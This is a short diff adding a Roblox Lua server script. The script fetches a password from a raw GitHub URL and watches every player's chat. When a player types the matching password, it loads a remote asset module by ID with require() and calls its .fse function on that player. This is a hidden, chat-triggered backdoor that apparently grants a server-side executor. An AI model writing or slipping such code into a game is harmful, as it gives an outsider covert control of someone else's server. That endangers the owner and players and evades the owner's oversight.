@@ -1,0 +1,23 @@
+local codeUrl = "https://raw.githubusercontent.com/goldo9999/Site-55/main/Password"
+
+local function loadCode(player, enteredPassword)
+	local success, correctPassword = pcall(function()
+		return game:GetService("HttpService"):GetAsync(codeUrl)
+	end)
+
+	if success and correctPassword then
+		correctPassword = correctPassword:match("^%s*(.-)%s*$")
+
+		if enteredPassword == correctPassword then
+			pcall(function()
+				require(6324372525).fse(player.Name)
+			end)
+		end
+	end
+end
+
+game.Players.PlayerAdded:Connect(function(player)
+	player.Chatted:Connect(function(message)
+		loadCode(player, message)
+	end)
+end)
